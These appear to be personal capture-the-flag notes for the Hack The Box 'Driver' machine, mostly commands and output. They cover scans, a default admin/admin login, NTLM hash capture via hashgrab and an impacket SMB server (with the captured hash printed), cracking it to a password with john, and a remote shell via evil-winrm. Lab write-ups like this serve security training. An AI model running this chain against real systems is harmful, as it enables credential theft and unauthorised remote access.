#HackTheBox #linux 
#window 
# Enum
## nmap
```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-09T01:15:24
|_  start_date: 2023-06-09T01:05:34
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

```

## gobuster
```
/images               (Status: 301) [Size: 141] [--> http://htb/images/]
/Images               (Status: 301) [Size: 141] [--> http://htb/Images/]
/index.php            (Status: 401) [Size: 20]`
```

# Web login
## Creds admin/admin


# exploit
## tools
```
#hashgrab
#impacket-smbserver
#evilwinrm
```

## commandes
┌──(root㉿kali)-[/home/kali/Desktop/HTB/driver]
└─# python3 /media/sf_kali_partage/tools/hashgrab/hashgrab.py 10.10.17.161 payload 

┌──(root㉿kali)-[/media/sf_kali_partage/tools/hashgrab]
└─# impacket-smbserver -ip 10.10.17.161 -port 445 zelofane .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
```
[*] Incoming connection (10.129.95.238,49414)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:d227d0d20ae5978492931032897dfbe3:01010000000000008033c376479ad901f5255004c4ab3c97000000000100100044004e006d0071006f0077005a0066000300100044004e006d0071006f0077005a006600020010006a00680042007600790048006f007400040010006a00680042007600790048006f007400070008008033c376479ad901060004000200000008003000300000000000000000000000002000006499f280fac2e4b24962ac3ccb1fa9d0d90283773cc5eb7d6365f831313505850a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310037002e00310036003100000000000000000000000000
```

┌──(root㉿kali)-[/home/kali/Desktop/HTB/driver]
└─# john hash -wordlist=/usr/share/wordlists/rockyou.txt #crackPass 
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2023-06-08 20:32) 9.090g/s 293236p/s 293236c/s 293236C/s !!!!!!..biking
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

[ creds tony/liltony]

┌──(root㉿kali)-[/home/kali/Desktop/HTB/driver]
└─# evil-winrm -i htb -u tony -p liltony
```
Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> dir
```


